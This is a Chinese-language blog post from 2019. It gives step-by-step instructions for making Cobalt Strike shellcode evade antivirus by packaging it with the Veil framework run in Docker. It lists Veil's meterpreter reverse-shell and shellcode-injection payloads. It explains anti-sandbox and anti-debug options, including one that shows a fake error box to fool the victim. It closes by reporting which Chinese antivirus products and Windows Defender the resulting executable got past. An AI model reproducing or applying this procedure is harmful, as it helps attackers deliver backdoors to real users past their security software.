---
layout: post
title: 免杀：结合veillCS shellcode免杀
date: 2019-10-06
categories: blog
tags: [免杀，shellcode]
description: 结合veillCS shellcode免杀
---

#### 一、CS生成shellcode
攻击-生成后门-payload generator-选veil
![](https://qiya7.github.io/images/miansha/1.png)
#### 二、安装veil
- 安装`docker pull mattiasohlsson/veil`
- 启动`docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil`
- 生成的exe文件在/tmp/veil-output，之后在这取

#### 三、veil免杀
```shell
[*] Available Tools:
    1)  Evasion
    2)  Ordnance
use 1

[*] Available Payloads:

    1)  autoit/shellcode_inject/flat.py

    2)  auxiliary/coldwar_wrapper.py
    3)  auxiliary/macro_converter.py
    4)  auxiliary/pyinstaller_wrapper.py

    5)  c/meterpreter/rev_http.py
    6)  c/meterpreter/rev_http_service.py
    7)  c/meterpreter/rev_tcp.py
    8)  c/meterpreter/rev_tcp_service.py

    9)  cs/meterpreter/rev_http.py
    10) cs/meterpreter/rev_https.py
    11) cs/meterpreter/rev_tcp.py
    12) cs/shellcode_inject/base64.py
    13) cs/shellcode_inject/virtual.py

    14) go/meterpreter/rev_http.py
    15) go/meterpreter/rev_https.py
    16) go/meterpreter/rev_tcp.py
    17) go/shellcode_inject/virtual.py

    18) lua/shellcode_inject/flat.py

    19) perl/shellcode_inject/flat.py

use 17
```

```shell
BADMACS 设置为Y表示 查看运行环境的MAC地址如果不是虚拟机才会执行payload （反调试）
CLICKTRACK 设置为4表示 表示需要4次点击才会执行
CURSORCHECK 设置为100表示 运行环境的硬盘大小如果大于100GB才会执行payload （反沙箱）
COMPILE_TO_EXE 设置为Y表示 编译为exe文件
HOSTNAME 设置为Comp1表示 只有在Hostname计算机名为Comp1时才会执行payload（指定目标环境 反沙箱的方式）
INJECT_METHOD 可设置为Virtual 或 Heap
MINPROCS 设置为20表示 只有运行环境的运行进程数大于20时才会执行payload（指定目标环境 反沙箱的方式）
PROCCHECK 设置为Y表示 只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）
PROCESSORS 设置为2表示 只在至少2核的机器中才会执行payload（指定目标环境 反沙箱的方式）
RAMCHECK 设置为Y表示 只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）
SLEEP 设置为10表示 休眠10秒 以检测是否运行过程中被加速（反沙箱）
USERNAME 设置为Tom表示 只有在当前用户名为Tom的机器中才执行payload。
USERPROMPT 设置为Y表示 在injection之前提醒用户（提示一个错误框，让用户误以为该程序执行错误才无法打开）
DEBUGGER 设置为Y表示 当被调试器不被attached时才会执行payload （反调试）
DOMAIN 设置为Comp表示 受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）
UTCCHECK 设置为Y表示 只在运行环境的系统使用UTC时间时，才会执行payload
```
- set 都是可选的，都为了绕过，不选也行
- `generate`(生成)
- 复制CS生成的payload.txt内容，到这个位置
![](https://qiya7.github.io/images/miansha/2.png)
- 输入文件名
- 去这找生成的exe文件，/tmp/veil-output

#### 测试
win7：随便过
win10：此种免杀可以过360、火绒、qq管家等杀软，但是过不了windwos defender？？，然而安装了360、火绒、qq管家等杀软会把win10的defender挤掉，所以也能过？？
2019年10月6日复测，最新的数字卫士已经能检测出来了















